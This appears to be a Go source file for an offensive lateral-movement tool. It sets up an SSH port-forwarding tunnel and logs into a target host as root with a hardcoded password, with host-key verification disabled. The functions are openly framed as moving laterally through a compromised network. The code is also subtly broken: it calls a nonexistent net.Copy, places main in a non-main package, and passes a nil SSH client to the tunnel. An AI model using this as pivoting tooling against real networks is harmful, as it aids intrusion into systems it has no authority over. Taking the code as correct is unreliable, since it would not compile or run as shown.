package lateral

import (
	"fmt"
	"golang.org/x/crypto/ssh"
	"net"
)

func setup_ssh_tunnel(client *ssh.Client, local_port int, remote_host string, remote_port int) error {
	listener, err := net.Listen("tcp", fmt.Sprintf("localhost:%d", local_port))
	if err != nil {
		return err
	}

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				fmt.Println("Tunnel error:", err)
				return
			}
			go func() {
				remote_conn, err := client.Dial("tcp", fmt.Sprintf("%s:%d", remote_host, remote_port))
				if err != nil {
					fmt.Println("Error establishing tunnel:", err)
					conn.Close()
					return
				}
				go func() { _, _ = net.Copy(remote_conn, conn) }()
				go func() { _, _ = net.Copy(conn, remote_conn) }()
			}()
		}
	}()

	fmt.Printf("[+] SSH tunnel set up on localhost:%d to %s:%d\n", local_port, remote_host, remote_port)
	return nil
}

func move_laterally(client *ssh.Client, target_ip string, username string, password string) (*ssh.Client, error) {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	new_client, err := ssh.Dial("tcp", target_ip+":22", config)
	if err != nil {
		return nil, err
	}

	fmt.Printf("[+] Successfully moved laterally to %s\n", target_ip)
	return new_client, nil
}

func main() {
	var client *ssh.Client

	err := setup_ssh_tunnel(client, 8080, "192.168.1.105", 22) //example
	if err != nil {
		fmt.Println("Error setting up tunnel:", err)
		return
	}

	new_client, err := move_laterally(client, "192.168.1.105", "root", "password123") //example
	if err != nil {
		fmt.Println("Error moving laterally:", err)
		return
	}

	_ = new_client
}